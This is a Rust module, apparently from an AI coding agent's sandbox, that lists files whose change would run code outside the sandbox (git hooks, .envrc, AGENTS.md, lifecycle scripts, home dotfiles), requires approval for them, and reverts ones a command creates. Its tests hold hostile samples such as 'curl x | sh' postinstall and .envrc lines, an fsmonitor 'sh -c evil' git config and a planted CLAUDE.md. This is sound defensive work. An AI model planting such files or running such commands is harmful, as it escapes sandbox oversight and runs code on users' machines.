//! Protected paths: files whose change would run code or instructions *outside* the sandbox later, so they ask
//! even in yolo (and even after an "always"), and are mounted read-only inside the sandbox.
//!
//! New in marv-rs (`docs/SECURITY.md`, from the 2026-10-12 audit of Marv 0.3.0). Marv protected only `.git`
//! (`touchesGit`, `gitGuard`); its known-limits note ("a command can still change files the user later runs outside
//! the sandbox: scripts, a nested repo's .git, .envrc") is what this closes.
//!
//! - `.git/` (any level: a nested repository's config runs too) and the `core.hooksPath` folder: git runs hooks and
//!   config outside any sandbox on the user's next commit.
//! - `.env*`, `.envrc`: direnv and dotenv loaders read them in the user's shell.
//! - `bunfig.toml`: Bun reads it (preload scripts) for any `bun` the user runs there.
//! - `.mcp.json`: a project MCP server is a program Marv starts outside the sandbox (trust-gated, but trust is per hash).
//! - `AGENTS.md` / `CLAUDE.md` at any level, `.marv/**`: instructions and config every future session obeys.
//! - `.vscode/`, `.idea/`: tasks and run configurations the editor executes.
//! - `package.json` lifecycle `scripts`: a *content* rule (`lifecycle_scripts_changed`), not a path rule, so an
//!   ordinary dependency edit doesn't ask.
//!
//! Every check is made on the real path (and on the path as written: a symlink named `AGENTS.md` is read by the next
//! session as `AGENTS.md`). Unknown means protected: [`is_protected`] fails closed.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use crate::SandboxError;
use crate::paths::{expand_home, is_inside, normalize, real_with_missing};

/// Which rule makes a path protected.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ProtectedRule {
    GitDir,
    HooksPath,
    EnvFile,
    Envrc,
    Bunfig,
    McpJson,
    AgentInstructions,
    MarvDir,
    EditorConfig,
    /// Content rule only: see [`lifecycle_scripts_changed`].
    PackageScripts,
    /// Only when the project is the home folder (or holds it): see [`home_rule`].
    HomeDotfile,
}

/// One rule as the approval prompt and the docs show it.
#[derive(Debug, Clone, Copy)]
pub struct ProtectedPath {
    pub rule: ProtectedRule,
    /// What it matches, for display.
    pub pattern: &'static str,
    /// Why a change there escapes the sandbox (shown in the approval's warning line).
    pub why: &'static str,
}

/// The rules, in the order they're checked.
pub const PROTECTED_PATHS: &[ProtectedPath] = &[
    ProtectedPath { rule: ProtectedRule::GitDir, pattern: ".git/", why: "git runs its hooks and config outside the sandbox" },
    ProtectedPath { rule: ProtectedRule::HooksPath, pattern: "core.hooksPath", why: "git runs these hooks outside the sandbox" },
    ProtectedPath {
        rule: ProtectedRule::EnvFile,
        pattern: ".env*",
        why: "dotenv loaders read it in your shell, and it often holds secrets",
    },
    ProtectedPath { rule: ProtectedRule::Envrc, pattern: ".envrc", why: "direnv runs it in your shell" },
    ProtectedPath {
        rule: ProtectedRule::Bunfig,
        pattern: "bunfig.toml",
        why: "bun runs its preload scripts for every bun command",
    },
    ProtectedPath {
        rule: ProtectedRule::McpJson,
        pattern: ".mcp.json",
        why: "it names programs Marv starts outside the sandbox",
    },
    ProtectedPath {
        rule: ProtectedRule::AgentInstructions,
        pattern: "AGENTS.md, CLAUDE.md",
        why: "every future session follows them",
    },
    ProtectedPath { rule: ProtectedRule::MarvDir, pattern: ".marv/**", why: "Marv's project config, skills, agents and checks" },
    ProtectedPath { rule: ProtectedRule::EditorConfig, pattern: ".vscode/, .idea/", why: "your editor runs its tasks" },
    ProtectedPath {
        rule: ProtectedRule::PackageScripts,
        pattern: "package.json scripts",
        why: "install and lifecycle scripts run on your next install",
    },
    ProtectedPath {
        rule: ProtectedRule::HomeDotfile,
        pattern: "~/.* (project is the home folder)",
        why: "your shell, desktop, services and tools run or read it outside the sandbox",
    },
];

impl ProtectedRule {
    pub fn info(self) -> &'static ProtectedPath {
        PROTECTED_PATHS.iter().find(|p| p.rule == self).expect("every rule is listed")
    }
}

/// The rule for a project-relative path, by its components alone (pure).
pub fn rule_for_relative(rel: &Path) -> Option<ProtectedRule> {
    let names: Vec<String> = rel.components().map(|c| c.as_os_str().to_string_lossy().into_owned()).collect();
    if names.iter().any(|n| n == ".git") {
        return Some(ProtectedRule::GitDir);
    }
    if names.iter().any(|n| n == ".marv") {
        return Some(ProtectedRule::MarvDir);
    }
    if names.iter().any(|n| n == ".vscode" || n == ".idea") {
        return Some(ProtectedRule::EditorConfig);
    }
    let file = names.last()?;
    // Case-insensitively: on a case-insensitive file system `agents.md` *is* AGENTS.md.
    let lower = file.to_ascii_lowercase();
    match lower.as_str() {
        ".envrc" => Some(ProtectedRule::Envrc),
        "bunfig.toml" => Some(ProtectedRule::Bunfig),
        ".mcp.json" => Some(ProtectedRule::McpJson),
        "agents.md" | "claude.md" => Some(ProtectedRule::AgentInstructions),
        _ if lower.starts_with(".env") => Some(ProtectedRule::EnvFile),
        _ => None,
    }
}

/// Whether a file name is a secret's, as docs/SECURITY.md lists them: `.env*`, `*.pem`, `id_*` (case-insensitively, as
/// [`rule_for_relative`]). Secrets need approval to read; marv-rs #62 refuses an instruction file that links to one.
/// The read_file gate (guard `reading_a_secret_asks`) is meant to use this too.
pub fn is_secret_name(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    (lower.starts_with(".env") && lower != ".envrc") || lower.ends_with(".pem") || lower.starts_with("id_")
}

/// The rule protecting `path` (absolute, or relative to `root`), checked on the path as written and on where it
/// really leads. A path that leads outside the project is an error (`resolve_in_project` refuses it anyway).
pub fn protected_rule(root: &Path, path: &Path) -> Result<Option<ProtectedRule>, SandboxError> {
    let absolute = normalize(&root.join(path));
    let real_root = std::fs::canonicalize(root)?;
    // Through a dangling symlink too: a write through `innocent.sh -> .envrc` creates `.envrc` (#8).
    let real = real_with_missing(&absolute)?;
    let outside = || SandboxError::OutsideProject { path: path.display().to_string(), root: root.display().to_string() };
    let real_rel = real.strip_prefix(&real_root).map_err(|_| outside())?;
    let lexical_rel = absolute.strip_prefix(root).map_err(|_| outside())?;
    if let Some(rule) = rule_for_relative(lexical_rel).or_else(|| rule_for_relative(real_rel)) {
        return Ok(Some(rule));
    }
    if let Some(hooks) = hooks_path(root) {
        let hooks = std::fs::canonicalize(&hooks).unwrap_or(hooks);
        if is_inside(&hooks, &real) {
            return Ok(Some(ProtectedRule::HooksPath));
        }
    }
    Ok(None)
}

/// Whether a change to `path` must ask even in yolo. Fails closed: anything that can't be checked is protected.
pub fn is_protected(root: &Path, path: &Path) -> bool {
    protected_rule(root, path).map(|rule| rule.is_some()).unwrap_or(true)
}

/// The `core.hooksPath` folder from the project's `.git/config`, resolved against the project (a relative value is
/// relative to the work tree, as git reads it). Only the repository's own config: a global hooksPath lives outside
/// the project, where the sandbox can't write anyway.
pub fn hooks_path(root: &Path) -> Option<PathBuf> {
    core_hooks_path(&root.join(".git/config"), Some(root))
}

/// `core.hooksPath` from a git config file; a relative value is resolved against `base` (a repository's work tree),
/// and ignored without one (a global config's relative value depends on where git runs).
fn core_hooks_path(file: &Path, base: Option<&Path>) -> Option<PathBuf> {
    let config = std::fs::read_to_string(file).ok()?;
    let mut in_core = false;
    let mut found = None;
    for line in config.lines() {
        let line = line.trim();
        if line.starts_with('[') {
            in_core = line.trim_start_matches('[').trim_end_matches(']').trim().eq_ignore_ascii_case("core");
            continue;
        }
        if !in_core {
            continue;
        }
        if let Some((key, value)) = line.split_once('=')
            && key.trim().eq_ignore_ascii_case("hookspath")
        {
            let value = value.trim().trim_matches('"');
            let home = std::env::var_os("HOME").map(PathBuf::from).unwrap_or_default();
            let path = expand_home(value, &home);
            // The last one wins, as in git.
            found = if path.is_absolute() { Some(path) } else { base.map(|b| b.join(path)) };
        }
    }
    found
}

/// marv-rs: when the project is the home folder or holds it (Marv started in `~`), `edit_file` and `write_file` reach
/// the whole home, and they run in Marv's own process, not in the sandbox. A change to any hidden top-level entry
/// (`~/.bashrc`, `~/.profile`, `~/.config/systemd/user/*`, `~/.config/autostart`, `~/.ssh/authorized_keys`,
/// `~/.local/bin/*`…) runs outside the sandbox later, so it is protected: it asks every time, never covered by an
/// "always", never in yolo. So is a git hooks folder any repository in the home uses (`core.hooksPath` of the
/// repository around the file, or of the global git config); `.git/` itself is protected anywhere already.
///
/// Checked on the path as written and on where it really leads; a path that can't be resolved is protected.
/// `None` for any other project: its files can't reach the home.
pub fn home_rule(root: &Path, home: &Path, path: &Path) -> Option<ProtectedRule> {
    let real = |p: &Path| std::fs::canonicalize(p).unwrap_or_else(|_| p.to_path_buf());
    let (real_root, real_home) = (real(root), real(home));
    if !real_home.starts_with(&real_root) || home.as_os_str().is_empty() || real_home == Path::new("/") {
        return None;
    }
    let absolute = normalize(&root.join(path));
    let Ok(resolved) = real_with_missing(&absolute) else { return Some(ProtectedRule::HomeDotfile) };
    let hidden = |p: &Path, base: &Path| {
        p.strip_prefix(base)
            .ok()
            .and_then(|rel| rel.components().next())
            .is_some_and(|first| first.as_os_str().to_string_lossy().starts_with('.'))
    };
    if hidden(&absolute, home) || hidden(&absolute, &real_home) || hidden(&resolved, &real_home) {
        return Some(ProtectedRule::HomeDotfile);
    }
    // Hooks folders: the global config's, and each enclosing repository's (the project's own is `HooksPath`).
    let mut hooks: Vec<PathBuf> = [real_home.join(".gitconfig"), real_home.join(".config/git/config")]
        .iter()
        .filter_map(|file| core_hooks_path(file, None))
        .collect();
    for dir in resolved.ancestors().skip(1).take_while(|d| d.starts_with(&real_root)) {
        if let Some(found) = core_hooks_path(&dir.join(".git/config"), Some(dir)) {
            hooks.push(found);
        }
    }
    hooks.into_iter().any(|h| is_inside(&normalize(&real(&h)), &resolved)).then_some(ProtectedRule::HomeDotfile)
}

/// npm's lifecycle scripts: run by `npm|bun|pnpm install` and friends, outside the sandbox when the user runs them.
pub const LIFECYCLE_SCRIPTS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
    "prepublishOnly",
    "prepack",
    "postpack",
    "preuninstall",
    "uninstall",
    "postuninstall",
    "dependencies",
];

/// Whether a `package.json` change adds, removes or changes a lifecycle script. A file that doesn't parse after the
/// change counts as changed (fail closed); `before` is None for a new file.
pub fn lifecycle_scripts_changed(before: Option<&str>, after: &str) -> bool {
    let scripts = |text: &str| -> Option<Vec<(String, serde_json::Value)>> {
        let value: serde_json::Value = serde_json::from_str(text).ok()?;
        let map = value.get("scripts").and_then(|s| s.as_object());
        Some(
            LIFECYCLE_SCRIPTS.iter().filter_map(|k| map.and_then(|m| m.get(*k)).map(|v| ((*k).to_string(), v.clone()))).collect(),
        )
    };
    let Some(now) = scripts(after) else { return true };
    match before.map(scripts) {
        None => !now.is_empty(),
        Some(None) => true,
        Some(Some(was)) => was != now,
    }
}

/// Every protected path that exists in the project, at any level (and the hooks folder), mounted read-only on top of
/// the writable project: `.envrc`, but also `packages/a/AGENTS.md` and `apps/web/.vscode/`. Only the topmost protected
/// entry is mounted (a protected folder covers what's in it). Found with the scan's walker, so the same folders are
/// skipped ([`SKIPPED_DIRS`]). `.git` folders are left to `git_guard` (an approved `git_write` command must write
/// them); bash makes nested ones read-only for confined commands ([`nested_git_dirs`]).
///
/// bwrap can only mount what exists, so a command can still *create* `.envrc` or a nested `AGENTS.md`: those are
/// caught after the command by [`scan_created`]. A mount point can't be removed, so a command can't delete a folder
/// that holds a protected file either.
pub fn protected_mounts(root: &Path) -> Vec<PathBuf> {
    let hooks = hooks_rel(root);
    let mut mounts = Vec::new();
    walk(root, Path::new(""), &mut |rel, _| match walk_rule(rel, hooks.as_deref()) {
        Some(ProtectedRule::GitDir) => false,
        Some(_) => {
            let path = root.join(rel);
            // bwrap can't mount on a symlink; its target is checked by the path rules instead.
            if std::fs::symlink_metadata(&path).is_ok_and(|m| !m.file_type().is_symlink()) {
                mounts.push(path);
            }
            false
        }
        None => true,
    });
    // A hooks folder under a skipped folder (`node_modules/…`) isn't walked, but git runs it all the same.
    if let Some(hooks) = hooks_path(root)
        && hooks.starts_with(root)
        && hooks.is_dir()
        && !mounts.iter().any(|m| hooks.starts_with(m))
    {
        mounts.push(hooks);
    }
    mounts
}

/// The project's nested `.git` folders (a vendored repository, a submodule's `.git` file), which bash mounts read-only
/// for a command that runs without asking: git runs their config and hooks when the user works in that folder. The
/// project's own `.git` is `git_guard`'s.
pub fn nested_git_dirs(root: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    walk(root, Path::new(""), &mut |rel, _| {
        if rule_for_relative(rel) == Some(ProtectedRule::GitDir) {
            let path = root.join(rel);
            if rel != Path::new(".git") && std::fs::symlink_metadata(&path).is_ok_and(|m| !m.file_type().is_symlink()) {
                found.push(path);
            }
            return false;
        }
        true
    });
    found
}

/// The protected entries that existed before a command ran, project-relative. Taken by [`protected_snapshot`].
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ProtectedSnapshot(BTreeSet<PathBuf>);

impl ProtectedSnapshot {
    pub fn contains(&self, rel: &Path) -> bool {
        self.0.contains(rel)
    }
    pub fn len(&self) -> usize {
        self.0.len()
    }
    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }
}

/// A protected entry a command created: the project path (`pkg/AGENTS.md`), its rule, and whether
/// [`revert_created`] removed it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CreatedProtected {
    pub path: String,
    pub rule: ProtectedRule,
    pub reverted: bool,
}

/// The rule for an entry met while walking the project: by name ([`rule_for_relative`]), or inside the
/// `core.hooksPath` folder (which may not exist yet, so it can't be mounted read-only before the command).
fn walk_rule(rel: &Path, hooks: Option<&Path>) -> Option<ProtectedRule> {
    rule_for_relative(rel).or_else(|| hooks.filter(|h| rel.starts_with(h)).map(|_| ProtectedRule::HooksPath))
}

/// The hooks folder relative to the project, when it's inside it.
fn hooks_rel(root: &Path) -> Option<PathBuf> {
    hooks_path(root).and_then(|h| normalize(&h).strip_prefix(root).ok().map(Path::to_path_buf))
}

/// Folders the walker never goes into, at any level. Their own entry is still visited (a *new* `.git` is reported),
/// but nothing inside them:
/// - `node_modules` and `target`: dependencies and build output, often hundreds of thousands of files, and Marv
///   loads nothing from them (`AGENTS.md` and skills are read from the project's own folders, `.envrc`/`.env` by
///   direnv and dotenv loaders from the folder the user is in). Walking them three times per command would make
///   every command slow. A file planted there matters only if something loads it from there, which the user does by
///   working inside `node_modules`, and that is out of reach for any scan.
/// - `.git`: git's own data; what changes there is `git_guard`'s business, and an approved `git_write` command must
///   change it.
pub const SKIPPED_DIRS: &[&str] = &["node_modules", "target", ".git"];

/// Walks the project without following symlinks. `visit(rel, is_dir)` returns whether to descend into a folder;
/// [`SKIPPED_DIRS`] never are.
fn walk(root: &Path, rel: &Path, visit: &mut dyn FnMut(&Path, bool) -> bool) {
    let Ok(entries) = std::fs::read_dir(root.join(rel)) else { return };
    let mut names: Vec<_> = entries.flatten().map(|e| e.file_name()).collect();
    names.sort();
    for name in names {
        let child = rel.join(&name);
        let Ok(meta) = std::fs::symlink_metadata(root.join(&child)) else { continue };
        let is_dir = meta.is_dir(); // false for a symlink: never followed
        let skipped = is_dir && name.to_str().is_some_and(|n| SKIPPED_DIRS.contains(&n));
        if visit(&child, is_dir) && is_dir && !skipped {
            walk(root, &child, visit);
        }
    }
}

/// Every protected entry in the project, before a command runs (see [`scan_created`]). [`SKIPPED_DIRS`] aren't walked.
pub fn protected_snapshot(root: &Path) -> ProtectedSnapshot {
    let hooks = hooks_rel(root);
    let mut found = BTreeSet::new();
    walk(root, Path::new(""), &mut |rel, _| match walk_rule(rel, hooks.as_deref()) {
        Some(rule) => {
            found.insert(rel.to_path_buf());
            rule != ProtectedRule::GitDir
        }
        None => true,
    });
    ProtectedSnapshot(found)
}

/// The protected entries a command created: anything protected that wasn't in `before` (marv-rs, docs/SECURITY.md).
///
/// Why: protected paths are mounted read-only, but bwrap can only mount what exists ([`protected_mounts`]), so a
/// sandboxed command could still write a new `.envrc` (direnv runs it in the user's shell), a nested `AGENTS.md` or
/// `.git` (its config runs on the user's next `git status` there), or the missing `core.hooksPath` folder. Only the
/// topmost new entry is reported (a new `.marv/` once, not each file in it). Nothing is changed: [`revert_created`]
/// removes them. Bash calls it after every sandboxed command, once bwrap's placeholder mount points are removed (an
/// empty `.git` placeholder left behind would read as created).
///
/// Existing protected files, at any level, are mounted read-only ([`protected_mounts`]), so the scan only needs what's
/// new. It skips [`SKIPPED_DIRS`] (see there why).
pub fn scan_created(root: &Path, before: &ProtectedSnapshot) -> Vec<CreatedProtected> {
    let hooks = hooks_rel(root);
    let mut created = Vec::new();
    walk(root, Path::new(""), &mut |rel, _| match walk_rule(rel, hooks.as_deref()) {
        Some(rule) if !before.contains(rel) => {
            created.push(CreatedProtected { path: project_rel(rel), rule, reverted: false });
            false
        }
        Some(rule) => rule != ProtectedRule::GitDir,
        None => true,
    });
    created
}

fn project_rel(rel: &Path) -> String {
    rel.components().map(|c| c.as_os_str().to_string_lossy()).collect::<Vec<_>>().join("/")
}

/// Removes what [`scan_created`] found (a folder with everything in it; a symlink itself, never its target) and marks
/// each one `reverted`. An entry whose folder now leads outside the project (swapped for a symlink since the scan) is
/// left alone and stays unreverted.
pub fn revert_created(root: &Path, created: &mut [CreatedProtected]) {
    let Ok(real_root) = std::fs::canonicalize(root) else { return };
    for entry in created.iter_mut() {
        let path = root.join(&entry.path);
        let parent_inside = path.parent().and_then(|p| std::fs::canonicalize(p).ok()).is_some_and(|p| is_inside(&real_root, &p));
        let Ok(meta) = std::fs::symlink_metadata(&path) else {
            entry.reverted = true; // already gone
            continue;
        };
        if !parent_inside {
            continue;
        }
        let removed = if meta.is_dir() { std::fs::remove_dir_all(&path) } else { std::fs::remove_file(&path) };
        entry.reverted = removed.is_ok();
    }
}

/// The `Marv:` note bash appends when a command created protected files, for the model and the transcript. None when
/// there were none.
pub fn created_note(created: &[CreatedProtected]) -> Option<String> {
    if created.is_empty() {
        return None;
    }
    let list = |reverted: bool| {
        created
            .iter()
            .filter(|c| c.reverted == reverted)
            .map(|c| format!("{} ({})", c.path, c.rule.info().why))
            .collect::<Vec<_>>()
            .join(", ")
    };
    let (removed, kept) = (list(true), list(false));
    let mut note = String::from("Marv: ");
    if !removed.is_empty() {
        note.push_str(&format!("the command created protected files, which were removed: {removed}. "));
    }
    if !kept.is_empty() {
        note.push_str(&format!("The command created protected files that couldn't be removed: {kept}. "));
    }
    note.push_str("Protected files change only with the user's approval: use write_file or edit_file for them.");
    Some(note)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::paths::test_dir::TempDir;
    use std::fs;
    use std::os::unix::fs::symlink;

    #[test]
    fn rules_by_name_at_any_level() {
        let rule = |p: &str| rule_for_relative(Path::new(p));
        assert_eq!(rule(".git/config"), Some(ProtectedRule::GitDir));
        assert_eq!(rule("vendor/lib/.git/hooks/pre-commit"), Some(ProtectedRule::GitDir));
        assert_eq!(rule(".env"), Some(ProtectedRule::EnvFile));
        assert_eq!(rule("apps/web/.env.local"), Some(ProtectedRule::EnvFile));
        assert_eq!(rule(".envrc"), Some(ProtectedRule::Envrc));
        assert_eq!(rule("bunfig.toml"), Some(ProtectedRule::Bunfig));
        assert_eq!(rule(".mcp.json"), Some(ProtectedRule::McpJson));
        assert_eq!(rule("AGENTS.md"), Some(ProtectedRule::AgentInstructions));
        // Secrets (docs/SECURITY.md), a different list: .envrc is protected but not a secret.
        for name in [".env", ".env.local", "server.pem", "KEY.PEM", "id_ed25519", "id_rsa.pub"] {
            assert!(is_secret_name(name), "{name}");
        }
        for name in [".envrc", "AGENTS.md", "pem.md", "ids.txt", "rules.md"] {
            assert!(!is_secret_name(name), "{name}");
        }
        assert_eq!(rule("packages/a/CLAUDE.md"), Some(ProtectedRule::AgentInstructions));
        assert_eq!(rule("docs/agents.md"), Some(ProtectedRule::AgentInstructions));
        assert_eq!(rule(".marv/checks/x.yaml"), Some(ProtectedRule::MarvDir));
        assert_eq!(rule(".vscode/tasks.json"), Some(ProtectedRule::EditorConfig));
        assert_eq!(rule(".idea/workspace.xml"), Some(ProtectedRule::EditorConfig));
        assert_eq!(rule("src/app.ts"), None);
        assert_eq!(rule("package.json"), None); // a content rule
        assert_eq!(rule("environment.ts"), None);
    }

    #[test]
    fn checked_after_realpath_and_as_written() {
        let root = TempDir::new("protected");
        let r = root.path();
        fs::write(r.join(".envrc"), "export X=1").unwrap();
        fs::write(r.join("notes.txt"), "x").unwrap();
        symlink(r.join(".envrc"), r.join("innocent.txt")).unwrap();
        symlink(r.join("notes.txt"), r.join("AGENTS.md")).unwrap();
        assert_eq!(protected_rule(r, Path::new("innocent.txt")).unwrap(), Some(ProtectedRule::Envrc));
        assert_eq!(protected_rule(r, Path::new("AGENTS.md")).unwrap(), Some(ProtectedRule::AgentInstructions));
        assert_eq!(protected_rule(r, Path::new("src/new.ts")).unwrap(), None);
        // A dangling link: a write through it creates the protected file.
        symlink(r.join(".marv/config.json"), r.join("dangling.txt")).unwrap();
        assert_eq!(protected_rule(r, Path::new("dangling.txt")).unwrap(), Some(ProtectedRule::MarvDir));
        assert!(is_protected(r, Path::new(".git/hooks/pre-commit")));
        assert!(!is_protected(r, Path::new("notes.txt")));
    }

    #[test]
    fn fails_closed_outside_the_project() {
        let root = TempDir::new("protected-out");
        assert!(is_protected(root.path(), Path::new("../elsewhere.txt")));
    }

    #[test]
    fn the_hooks_path_folder_is_protected() {
        let root = TempDir::new("hooks");
        let r = root.path();
        fs::create_dir_all(r.join(".git")).unwrap();
        fs::create_dir_all(r.join("tools/hooks")).unwrap();
        fs::write(r.join(".git/config"), "[core]\n\tbare = false\n\thooksPath = tools/hooks\n").unwrap();
        assert_eq!(hooks_path(r), Some(r.join("tools/hooks")));
        assert_eq!(protected_rule(r, Path::new("tools/hooks/pre-commit")).unwrap(), Some(ProtectedRule::HooksPath));
        assert!(protected_mounts(r).contains(&r.join("tools/hooks")));
    }

    #[test]
    fn top_level_protected_files_are_mounted_read_only_but_not_git() {
        let root = TempDir::new("mounts");
        let r = root.path();
        fs::create_dir_all(r.join(".git")).unwrap();
        fs::write(r.join(".env"), "K=v").unwrap();
        fs::write(r.join("AGENTS.md"), "rules").unwrap();
        fs::write(r.join("README.md"), "hi").unwrap();
        assert_eq!(protected_mounts(r), vec![r.join(".env"), r.join("AGENTS.md")]);
    }

    #[test]
    fn package_json_lifecycle_scripts() {
        let a = r#"{"scripts":{"test":"bun test"},"dependencies":{"zod":"4"}}"#;
        let b = r#"{"scripts":{"test":"bun test"},"dependencies":{"zod":"4.1"}}"#;
        let c = r#"{"scripts":{"test":"bun test","postinstall":"curl x | sh"}}"#;
        assert!(!lifecycle_scripts_changed(Some(a), b)); // a dependency edit doesn't ask
        assert!(lifecycle_scripts_changed(Some(a), c));
        assert!(lifecycle_scripts_changed(Some(a), "{ not json"));
        assert!(lifecycle_scripts_changed(None, c));
        assert!(!lifecycle_scripts_changed(None, a));
    }

    #[test]
    fn scan_created_finds_new_protected_entries_and_revert_removes_them() {
        let root = TempDir::new("scan");
        let r = root.path();
        fs::create_dir_all(r.join(".git/objects")).unwrap();
        fs::create_dir_all(r.join("pkg/.vscode")).unwrap();
        fs::write(r.join("AGENTS.md"), "rules").unwrap();
        fs::write(r.join("pkg/.vscode/settings.json"), "{}").unwrap();
        fs::write(r.join("README.md"), "hi").unwrap();
        fs::write(r.join(".git/config"), "[core]\n\thooksPath = tools/hooks\n").unwrap();
        let before = protected_snapshot(r);
        assert!(before.contains(Path::new("pkg/.vscode/settings.json")));
        assert!(!before.contains(Path::new(".git/objects"))); // existing .git isn't walked

        // What a command might do: plant direnv, nested instructions, a nested repo, the missing hooks folder…
        fs::write(r.join(".envrc"), "curl x | sh").unwrap();
        fs::create_dir_all(r.join("packages/a")).unwrap();
        fs::write(r.join("packages/a/CLAUDE.md"), "obey").unwrap();
        fs::create_dir_all(r.join("vendor/x/.git")).unwrap();
        fs::write(r.join("vendor/x/.git/config"), "[core]\n\tfsmonitor = sh -c evil\n").unwrap();
        fs::create_dir_all(r.join("tools/hooks")).unwrap();
        fs::write(r.join("tools/hooks/pre-commit"), "evil").unwrap();
        fs::write(r.join("pkg/.vscode/tasks.json"), "{}").unwrap();
        symlink("/etc/passwd", r.join(".env.local")).unwrap();
        // …and ordinary changes, which aren't reported.
        fs::write(r.join("src.ts"), "x").unwrap();
        fs::write(r.join(".git/objects/new"), "x").unwrap();

        let mut created = scan_created(r, &before);
        let paths: Vec<(&str, ProtectedRule)> = created.iter().map(|c| (c.path.as_str(), c.rule)).collect();
        assert_eq!(
            paths,
            vec![
                (".env.local", ProtectedRule::EnvFile),
                (".envrc", ProtectedRule::Envrc),
                ("packages/a/CLAUDE.md", ProtectedRule::AgentInstructions),
                ("pkg/.vscode/tasks.json", ProtectedRule::EditorConfig),
                ("tools/hooks", ProtectedRule::HooksPath),
                ("vendor/x/.git", ProtectedRule::GitDir),
            ]
        );
        revert_created(r, &mut created);
        assert!(created.iter().all(|c| c.reverted));
        for gone in [".env.local", ".envrc", "packages/a/CLAUDE.md", "pkg/.vscode/tasks.json", "tools/hooks", "vendor/x/.git"] {
            assert!(fs::symlink_metadata(r.join(gone)).is_err(), "{gone}");
        }
        assert!(Path::new("/etc/passwd").exists()); // the link went, not its target
        for kept in ["AGENTS.md", "pkg/.vscode/settings.json", "src.ts", ".git/objects/new", "packages/a", "vendor/x"] {
            assert!(r.join(kept).exists(), "{kept}");
        }
        assert!(scan_created(r, &before).is_empty());
        let note = created_note(&created).unwrap();
        assert!(note.starts_with("Marv: the command created protected files, which were removed: .env.local ("));
        assert!(note.contains(".envrc (direnv runs it in your shell)"));
        assert_eq!(created_note(&[]), None);
    }

    #[test]
    fn existing_protected_paths_at_any_level_are_mounted_but_not_inside_skipped_folders() {
        let root = TempDir::new("nested-mounts");
        let r = root.path();
        for rel in [".envrc", "packages/a/AGENTS.md", "apps/web/.vscode/tasks.json", "apps/web/.vscode/launch.json", "src/a.ts"] {
            fs::create_dir_all(r.join(rel).parent().unwrap()).unwrap();
            fs::write(r.join(rel), "x").unwrap();
        }
        for rel in ["node_modules/pkg/AGENTS.md", "target/debug/.env", "vendor/x/.git/config", ".git/hooks/x/AGENTS.md"] {
            fs::create_dir_all(r.join(rel).parent().unwrap()).unwrap();
            fs::write(r.join(rel), "x").unwrap();
        }
        symlink(r.join("src/a.ts"), r.join("src/CLAUDE.md")).unwrap();
        assert_eq!(protected_mounts(r), vec![r.join(".envrc"), r.join("apps/web/.vscode"), r.join("packages/a/AGENTS.md")]);
        assert_eq!(nested_git_dirs(r), vec![r.join("vendor/x/.git")]);
    }

    #[test]
    fn the_scan_skips_node_modules_target_and_git_but_reports_a_new_git() {
        let root = TempDir::new("scan-skip");
        let r = root.path();
        fs::create_dir_all(r.join(".git")).unwrap();
        let before = protected_snapshot(r);
        for rel in ["node_modules/x/.envrc", "target/release/.envrc", ".git/x/.envrc", "a/b/c/d/e/.envrc"] {
            fs::create_dir_all(r.join(rel).parent().unwrap()).unwrap();
            fs::write(r.join(rel), "x").unwrap();
        }
        fs::create_dir_all(r.join("lib/node_modules_extra/.git")).unwrap();
        let found: Vec<String> = scan_created(r, &before).into_iter().map(|c| c.path).collect();
        assert_eq!(found, ["a/b/c/d/e/.envrc", "lib/node_modules_extra/.git"]);
    }
}
